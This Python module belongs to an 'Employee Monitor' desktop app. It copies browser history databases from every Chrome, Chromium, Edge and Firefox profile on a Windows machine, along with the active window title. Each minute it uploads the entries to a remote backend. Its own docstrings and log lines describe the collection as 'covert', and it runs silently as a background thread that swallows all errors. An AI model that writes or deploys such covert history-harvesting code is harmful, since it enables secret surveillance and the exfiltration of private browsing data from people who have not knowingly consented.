import atexit
import hashlib
import json
import os
import shutil
import sqlite3
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path
from datetime import UTC, datetime, timedelta

# Low-level Windows hooks for process tracking
import win32gui
import win32process
import psutil

# Pull the path framework matching the rest of your app
from app.auth import load_auth_session
from app.env import HOSTED_DESKTOP_BACKEND_URL, prefer_hosted_backend_url, writable_runtime_path
from app.monitor_settings import get_monitor_feature_flags

# Separate path targets exactly matching your project architecture
DATA_ROOT = writable_runtime_path(os.getenv("RIGWEDA_MONITOR_DATA_ROOT", r"%LOCALAPPDATA%\rigweda-monitor\data"), "data")
LOG_DIR = writable_runtime_path(os.getenv("RIGWEDA_MONITOR_LOG_ROOT", str(DATA_ROOT.parent / "logs")), "logs")
QUEUE_DB = DATA_ROOT / "browser_history_queue.db"
STATE_FILE = DATA_ROOT / "browser_history_state.json"
DEVICE_ID_FILE = DATA_ROOT / "device_id.txt"
DEFAULT_DESKTOP_BACKEND_URL = "https://rigweda-monitor-backend.vercel.app/api"

STATUS_LOG_FILE = Path(LOG_DIR) / "browser_monitor.log"  # Thread status logs here

# Global states to track changes dynamically
last_processed_time = {}  # Track last processed timestamp per browser
_STOP_EVENT = threading.Event()
_MONITOR_THREAD: threading.Thread | None = None
_SHUTDOWN_REASON = "running"
_SHUTDOWN_REASON_LOGGED = False


def _browser_sync_interval_seconds() -> int:
    flags = get_monitor_feature_flags()
    try:
        minutes = max(int(flags.get("browserHistorySyncMinutes", 1)), 1)
        return minutes * 60
    except (TypeError, ValueError):
        return 60


def get_active_window_info() -> tuple[str, str]:
    """Returns a tuple containing (executable_name, window_title)."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            return process.name().lower(), win32gui.GetWindowText(hwnd)
    except Exception:
        pass
    return "unknown_app.exe", "Unknown Application Window"


def get_device_id() -> str:
    DATA_ROOT.mkdir(parents=True, exist_ok=True)
    try:
        value = DEVICE_ID_FILE.read_text(encoding="utf-8").strip()
    except FileNotFoundError:
        value = ""
    if not value:
        import uuid

        value = f"dev_{uuid.uuid4().hex}"
        DEVICE_ID_FILE.write_text(value, encoding="utf-8")
    return value


def _chrome_history_cutoff_microseconds(hours: int = 1) -> int:
    chrome_epoch = datetime(1601, 1, 1, tzinfo=UTC)
    now = datetime.now(UTC)
    total_seconds = (now - chrome_epoch).total_seconds()
    return int((total_seconds - (hours * 3600)) * 1_000_000)


def _sqlite_history_profile_paths(root: Path, database_name: str) -> list[tuple[str, Path]]:
    """Return every browser profile folder that contains the expected history DB."""
    if not root.exists():
        return []

    profiles: list[tuple[str, Path]] = []
    for profile_dir in root.iterdir():
        if not profile_dir.is_dir():
            continue
        db_path = profile_dir / database_name
        if db_path.exists():
            profiles.append((profile_dir.name, db_path))
    return profiles


def _copy_sqlite_database_with_sidecars(source: Path, destination: Path) -> None:
    """Copy the SQLite database plus any live WAL/SHM sidecars."""
    shutil.copy2(source, destination)
    for suffix in ("-wal", "-shm", "-journal"):
        sidecar_source = source.with_name(f"{source.name}{suffix}")
        if not sidecar_source.exists():
            continue
        sidecar_destination = destination.with_name(f"{destination.name}{suffix}")
        shutil.copy2(sidecar_source, sidecar_destination)


def _format_timestamp_text(value: datetime) -> str:
    timestamp = value if value.tzinfo is not None else value.replace(tzinfo=UTC)
    return timestamp.astimezone(UTC).isoformat(sep="T", timespec="microseconds").replace("+00:00", "Z")


def _parse_timestamp_text(value: str) -> datetime | None:
    text = str(value or "").strip()
    if not text:
        return None

    normalized = text.replace("Z", "+00:00")
    try:
        parsed = datetime.fromisoformat(normalized)
        return parsed if parsed.tzinfo is not None else parsed.replace(tzinfo=UTC)
    except ValueError:
        pass

    for timestamp_format in ("%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S.%f", "%Y-%m-%d %H:%M:%S"):
        try:
            parsed = datetime.strptime(text, timestamp_format)
            return parsed.replace(tzinfo=UTC)
        except ValueError:
            continue
    return None


def _get_chrome_history() -> list[dict]:
    """Reads Chrome/Chromium browser history from the local database (covert method)."""
    history_entries = []
    try:
        chrome_roots = [
            ("chrome", Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"))),
            ("chrome-beta", Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome Beta\User Data"))),
            ("chromium", Path(os.path.expandvars(r"%LOCALAPPDATA%\Chromium\User Data"))),
        ]

        for browser_source, chrome_root in chrome_roots:
            for profile_name, db_path in _sqlite_history_profile_paths(chrome_root, "History"):
                temp_db = Path(os.path.expandvars(r"%TEMP%")) / f"{browser_source}_{profile_name}_history_temp_{int(time.time())}.db"
                try:
                    _copy_sqlite_database_with_sidecars(db_path, temp_db)

                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    cursor.execute(
                        """
                        SELECT u.url, u.title, v.visit_time, v.visit_duration
                        FROM urls u
                        LEFT JOIN visits v ON u.id = v.url
                        WHERE v.visit_time > ?
                        ORDER BY v.visit_time DESC
                        LIMIT 100
                        """,
                        (_chrome_history_cutoff_microseconds(1),),
                    )

                    for row in cursor.fetchall():
                        url, title, visit_time, duration = row
                        if url and visit_time:
                            chrome_epoch = datetime(1601, 1, 1, tzinfo=UTC)
                            timestamp = chrome_epoch + timedelta(microseconds=visit_time)
                            history_entries.append({
                                "url": url,
                                "title": title or "",
                                "timestamp": _format_timestamp_text(timestamp),
                                "duration": duration or 0,
                                "browser": "Chrome",
                                "profile": f"{browser_source}:{profile_name}",
                            })

                    conn.close()
                except Exception:
                    pass
                finally:
                    try:
                        if temp_db.exists():
                            temp_db.unlink()
                    except Exception:
                        pass
    except Exception:
        pass
    
    return history_entries


def _get_firefox_history() -> list[dict]:
    """Reads Firefox browser history from the places.sqlite database (covert method)."""
    history_entries = []
    try:
        firefox_profile_path = Path(os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"))
        
        if not firefox_profile_path.exists():
            return history_entries
        
        for profile_name, db_path in _sqlite_history_profile_paths(firefox_profile_path, "places.sqlite"):
            temp_db = Path(os.path.expandvars(r"%TEMP%")) / f"firefox_{profile_name}_history_temp_{int(time.time())}.db"
            try:
                _copy_sqlite_database_with_sidecars(db_path, temp_db)

                conn = sqlite3.connect(str(temp_db))
                cursor = conn.cursor()
                cursor.execute(
                    """
                    SELECT p.url, p.title, v.visit_date
                    FROM moz_places p
                    LEFT JOIN moz_historyvisits v ON p.id = v.place_id
                    WHERE v.visit_date > ?
                    ORDER BY v.visit_date DESC
                    LIMIT 100
                    """,
                    (int((time.time() - 3600) * 1000000),),
                )

                for row in cursor.fetchall():
                    url, title, visit_date = row
                    if url and visit_date:
                        timestamp = datetime.fromtimestamp(visit_date / 1000000, tz=UTC)
                        history_entries.append({
                            "url": url,
                            "title": title or "",
                            "timestamp": _format_timestamp_text(timestamp),
                            "browser": "Firefox",
                            "profile": f"firefox:{profile_name}",
                        })

                conn.close()
            except Exception:
                pass
            finally:
                try:
                    if temp_db.exists():
                        temp_db.unlink()
                except Exception:
                    pass
    except Exception:
        pass
    
    return history_entries


def _get_edge_history() -> list[dict]:
    """Reads Microsoft Edge browser history from the local database (covert method)."""
    history_entries = []
    try:
        edge_root = Path(os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"))

        for profile_name, db_path in _sqlite_history_profile_paths(edge_root, "History"):
            temp_db = Path(os.path.expandvars(r"%TEMP%")) / f"edge_{profile_name}_history_temp_{int(time.time())}.db"
            try:
                _copy_sqlite_database_with_sidecars(db_path, temp_db)

                conn = sqlite3.connect(str(temp_db))
                cursor = conn.cursor()
                cursor.execute(
                    """
                    SELECT u.url, u.title, v.visit_time, v.visit_duration
                    FROM urls u
                    LEFT JOIN visits v ON u.id = v.url
                    WHERE v.visit_time > ?
                    ORDER BY v.visit_time DESC
                    LIMIT 100
                    """,
                    (_chrome_history_cutoff_microseconds(1),),
                )

                for row in cursor.fetchall():
                    url, title, visit_time, duration = row
                    if url and visit_time:
                        chrome_epoch = datetime(1601, 1, 1, tzinfo=UTC)
                        timestamp = chrome_epoch + timedelta(microseconds=visit_time)
                        history_entries.append({
                            "url": url,
                            "title": title or "",
                            "timestamp": _format_timestamp_text(timestamp),
                            "duration": duration or 0,
                            "browser": "Edge",
                            "profile": f"edge:{profile_name}",
                        })

                conn.close()
            except Exception:
                pass
            finally:
                try:
                    if temp_db.exists():
                        temp_db.unlink()
                except Exception:
                    pass
    except Exception:
        pass
    
    return history_entries


def write_to_log_folder(text_to_log: str) -> None:
    """Saves thread activity metrics into the log folder."""
    try:
        STATUS_LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with STATUS_LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(text_to_log)
    except Exception:
        pass


def _set_shutdown_reason(reason: str) -> None:
    global _SHUTDOWN_REASON
    clean_reason = str(reason or "").strip() or "unspecified"
    if _SHUTDOWN_REASON in ("running", ""):
        _SHUTDOWN_REASON = clean_reason


def _log_shutdown_once() -> None:
    global _SHUTDOWN_REASON_LOGGED
    if _SHUTDOWN_REASON_LOGGED:
        return
    _SHUTDOWN_REASON_LOGGED = True
    write_to_log_folder(f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] Browser monitor exiting. reason={_SHUTDOWN_REASON}\n")


def _log_shutdown_on_exit() -> None:
    if _SHUTDOWN_REASON != "running":
        _log_shutdown_once()


atexit.register(_log_shutdown_on_exit)


def _desktop_backend_url() -> str:
    return prefer_hosted_backend_url(
        os.getenv("DESKTOP_BACKEND_URL", DEFAULT_DESKTOP_BACKEND_URL),
        hosted_default=HOSTED_DESKTOP_BACKEND_URL,
    )


def _browser_history_endpoint() -> str:
    return f"{_desktop_backend_url()}/browser-history/batch"


def _entry_timestamp_value(entry: dict) -> str:
    timestamp = _parse_timestamp_text(str(entry.get("timestamp") or ""))
    if timestamp is None:
        return ""
    return _format_timestamp_text(timestamp)


def _normalize_timestamp(timestamp: str) -> str:
    parsed = _parse_timestamp_text(timestamp)
    if parsed is None:
        return str(timestamp or "").strip()
    return _format_timestamp_text(parsed)


def _build_entry_id(*, device_id: str, entry: dict) -> str:
    digest = hashlib.sha256()
    digest.update(device_id.encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("browser") or "").strip().lower().encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("profile") or "").strip().lower().encode("utf-8"))
    digest.update(b"|")
    digest.update(_entry_timestamp_value(entry).encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("url") or "").strip().encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("title") or "").strip().encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("activeWindow") or "").strip().encode("utf-8"))
    digest.update(b"|")
    digest.update(str(int(entry.get("duration") or 0)).encode("utf-8"))
    return digest.hexdigest()


def _normalize_entry_timestamp(value: str) -> str:
    parsed = _parse_timestamp_text(value)
    if parsed is None:
        return str(value or "").strip()
    return _format_timestamp_text(parsed)


def _load_browser_state() -> dict[str, str]:
    try:
        payload = json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return {}

    if not isinstance(payload, dict):
        return {}

    state: dict[str, str] = {}
    for browser, timestamp in payload.items():
        browser_name = str(browser or "").strip()
        timestamp_text = _normalize_timestamp(str(timestamp or "").strip())
        if browser_name and timestamp_text:
            state[browser_name] = timestamp_text
    return state


def _save_browser_state(state: dict[str, str]) -> None:
    try:
        DATA_ROOT.mkdir(parents=True, exist_ok=True)
        STATE_FILE.write_text(json.dumps(state, indent=2), encoding="utf-8")
    except OSError:
        pass


def _get_connection() -> sqlite3.Connection:
    DATA_ROOT.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(QUEUE_DB)
    connection.row_factory = sqlite3.Row
    connection.execute("PRAGMA journal_mode=WAL")
    connection.execute(
        """
        CREATE TABLE IF NOT EXISTS browser_history_entries (
          entry_id TEXT PRIMARY KEY,
          device_id TEXT NOT NULL,
          browser TEXT NOT NULL,
          url TEXT NOT NULL,
          title TEXT NOT NULL DEFAULT '',
          observed_at TEXT NOT NULL,
          duration_ms INTEGER NOT NULL DEFAULT 0,
          active_window_title TEXT,
          profile_key TEXT NOT NULL DEFAULT '',
          sync_status TEXT NOT NULL DEFAULT 'pending',
          retry_count INTEGER NOT NULL DEFAULT 0,
          last_error TEXT,
          created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
        )
        """
    )
    existing_columns = {
        str(row[1] or "").strip()
        for row in connection.execute("PRAGMA table_info(browser_history_entries)").fetchall()
    }
    if "profile_key" not in existing_columns:
        connection.execute("ALTER TABLE browser_history_entries ADD COLUMN profile_key TEXT NOT NULL DEFAULT ''")
    connection.execute(
        "CREATE INDEX IF NOT EXISTS idx_browser_history_entries_sync ON browser_history_entries (sync_status, created_at)"
    )
    connection.execute(
        "CREATE INDEX IF NOT EXISTS idx_browser_history_entries_browser_time ON browser_history_entries (browser, observed_at DESC)"
    )
    return connection


def _queue_history_entry(*, device_id: str, entry: dict) -> bool:
    observed_at = _entry_timestamp_value(entry)
    if not observed_at:
        return False

    entry_id = _build_entry_id(device_id=device_id, entry=entry)
    profile_key = str(entry.get("profile") or "").strip()
    with _get_connection() as connection:
        result = connection.execute(
            """
            INSERT INTO browser_history_entries (
              entry_id, device_id, browser, url, title, observed_at, duration_ms, active_window_title, profile_key
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(entry_id) DO UPDATE SET
              browser = excluded.browser,
              url = excluded.url,
              title = excluded.title,
              observed_at = excluded.observed_at,
              duration_ms = excluded.duration_ms,
              active_window_title = excluded.active_window_title,
              profile_key = excluded.profile_key,
              sync_status = 'pending',
              retry_count = 0,
              last_error = NULL
            """,
            (
                entry_id,
                device_id,
                str(entry.get("browser") or "").strip(),
                str(entry.get("url") or "").strip(),
                str(entry.get("title") or "").strip(),
                observed_at,
                int(entry.get("duration") or 0),
                str(entry.get("activeWindow") or "").strip() or None,
                profile_key,
            ),
        )
    return result.rowcount > 0


def _pending_history_rows(limit: int = 200) -> list[sqlite3.Row]:
    with _get_connection() as connection:
        return connection.execute(
            """
            SELECT *
            FROM browser_history_entries
            WHERE sync_status IN ('pending', 'failed')
            ORDER BY observed_at ASC, created_at ASC
            LIMIT ?
            """,
            (limit,),
        ).fetchall()


def _mark_history_rows(entry_ids: list[str], *, status: str, error: str | None = None) -> None:
    if not entry_ids:
        return

    with _get_connection() as connection:
        if status == "synced":
            connection.executemany(
                "DELETE FROM browser_history_entries WHERE entry_id = ?",
                [(entry_id,) for entry_id in entry_ids],
            )
            return

        connection.executemany(
            """
            UPDATE browser_history_entries
            SET sync_status = ?, retry_count = retry_count + 1, last_error = ?
            WHERE entry_id = ?
            """,
            [(status, error, entry_id) for entry_id in entry_ids],
        )


def _sync_history_batch(rows: list[sqlite3.Row]) -> tuple[bool, str]:
    session = load_auth_session()
    token = str((session or {}).get("token") or "").strip()
    if not token:
        return False, "Browser history sync skipped: no saved token."

    device_id = str(rows[0]["device_id"] or "").strip()
    if not device_id:
        return False, "Browser history sync skipped: missing device id."

    payload = {
        "deviceId": device_id,
        "entries": [
            {
                "entryId": row["entry_id"],
                "browser": row["browser"],
                "url": row["url"],
                "title": row["title"],
                "observedAt": _normalize_entry_timestamp(str(row["observed_at"] or "")),
                "durationMs": int(row["duration_ms"] or 0),
                "activeWindowTitle": row["active_window_title"] or None,
            }
            for row in rows
        ],
    }

    request = urllib.request.Request(
        _browser_history_endpoint(),
        data=json.dumps(payload).encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            response_body = response.read().decode("utf-8", "replace")
            if response_body:
                try:
                    data = json.loads(response_body)
                    if isinstance(data, dict) and data.get("success") is False:
                        return False, str(data.get("message") or "Browser history sync failed.")
                except json.JSONDecodeError:
                    pass
        return True, "Browser history synced successfully."
    except urllib.error.HTTPError as error:
        response_body = ""
        try:
            response_body = error.read().decode("utf-8", "replace").strip()
        except Exception:
            response_body = ""
        detail = f"{error} {response_body}".strip()
        return False, detail or "Browser history sync failed."
    except (urllib.error.URLError, TimeoutError, OSError) as error:
        return False, str(error)


def _flush_pending_history() -> None:
    pending_rows = _pending_history_rows()
    if not pending_rows:
        return

    state = _load_browser_state()
    by_state_key: dict[str, list[sqlite3.Row]] = {}
    for row in pending_rows:
        state_key = str(row["profile_key"] or row["browser"] or "").strip()
        if not state_key:
            continue
        by_state_key.setdefault(state_key, []).append(row)

    for state_key, rows in by_state_key.items():
        for start in range(0, len(rows), 200):
            batch = rows[start:start + 200]
            success, message = _sync_history_batch(batch)
            timestamp = time.strftime("%Y-%m-%dT%H:%M:%S")
            entry_ids = [str(row["entry_id"]) for row in batch]
            if success:
                _mark_history_rows(entry_ids, status="synced")
                latest_observed = max(
                    (_normalize_timestamp(str(row["observed_at"] or "")) for row in batch),
                    default=state.get(state_key, ""),
                )
                if latest_observed:
                    state[state_key] = latest_observed
                    _save_browser_state(state)
                write_to_log_folder(
                    f"[{timestamp}] Browser history sync: {len(batch)} entry(s) uploaded for {state_key}.\n"
                )
            else:
                _mark_history_rows(entry_ids, status="failed", error=message[:1000])
                write_to_log_folder(f"[{timestamp}] Browser history sync failed for {state_key}: {message}\n")


def check_browser_history():
    """Collects browser history from all installed browsers covertly via database access."""
    global last_processed_time
    
    try:
        current_app, current_title = get_active_window_info()
        device_id = get_device_id()
        state = _load_browser_state()

        # Scan browser history databases directly instead of relying on the
        # foreground app. History still exists even when a browser is not the
        # active window, and this keeps capture from missing short visits.
        browser_handlers = {
            "chrome.exe": _get_chrome_history,
            "msedge.exe": _get_edge_history,
            "firefox.exe": _get_firefox_history,
        }

        for browser_name, handler in browser_handlers.items():
            history_entries = handler()
            if not history_entries:
                continue

            for entry in history_entries:
                state_key = str(entry.get("profile") or browser_name or "").strip()
                last_sent = str(state.get(state_key, "") or last_processed_time.get(state_key, "") or "")
                timestamp = _entry_timestamp_value(entry)
                if not timestamp or timestamp <= last_sent:
                    continue
                queued = _queue_history_entry(
                    device_id=device_id,
                    entry={
                        "browser": browser_name,
                        "profile": state_key,
                        "url": entry.get("url", ""),
                        "title": entry.get("title", ""),
                        "timestamp": timestamp,
                        "duration": entry.get("duration", 0),
                        "activeWindow": current_title,
                    },
                )
                if queued:
                    current_latest = str(state.get(state_key, "") or last_processed_time.get(state_key, "") or "")
                    if timestamp > current_latest:
                        last_processed_time[state_key] = timestamp

        _flush_pending_history()
    except Exception as e:
        error_msg = f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] Error collecting browser history: {str(e)}\n"
        write_to_log_folder(error_msg)


# --- EXPOSED HOOK FOR BACKGROUND DISPATCH ---

def start_browser_monitor() -> tuple[bool, str]:
    """Runs a background thread monitoring browser history via covert database access."""
    try:
        flags = get_monitor_feature_flags()
        if not flags.get("browserHistoryEnabled", False):
            return False, "Browser history monitor is disabled by Employee Monitor settings."

        global _MONITOR_THREAD
        if _MONITOR_THREAD is not None and _MONITOR_THREAD.is_alive():
            return True, "Browser monitor is already running."

        _STOP_EVENT.clear()
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%S")
        sync_seconds = _browser_sync_interval_seconds()
        write_to_log_folder(
            f"\n[{timestamp}] --- Covert Browser History Monitor Thread Initialized --- interval={sync_seconds}s ---\n"
        )
        
        def monitor_loop():
            interval_seconds = _browser_sync_interval_seconds()
            while not _STOP_EVENT.is_set():
                try:
                    check_browser_history()
                except Exception as error:
                    write_to_log_folder(
                        f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] Browser monitor loop failed: {type(error).__name__}: {error}\n"
                    )
                interval_seconds = _browser_sync_interval_seconds()
                _STOP_EVENT.wait(interval_seconds)

        _MONITOR_THREAD = threading.Thread(target=monitor_loop, name="BrowserHistoryMonitor", daemon=True)
        _MONITOR_THREAD.start()
        return True, "Browser monitor started successfully."
    except Exception as e:
        _set_shutdown_reason("failed to start")
        write_to_log_folder(
            f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] Browser monitor failed to start: {type(e).__name__}: {e}\n"
        )
        return False, f"Failed to start browser monitor: {str(e)}"


def stop_browser_monitor() -> None:
    """Stops the background browser history monitoring thread."""
    global _MONITOR_THREAD

    _set_shutdown_reason("stop requested")
    _STOP_EVENT.set()
    thread = _MONITOR_THREAD
    if thread is not None and thread.is_alive():
        try:
            thread.join(timeout=2)
        except Exception:
            pass
    _MONITOR_THREAD = None
    _log_shutdown_once()

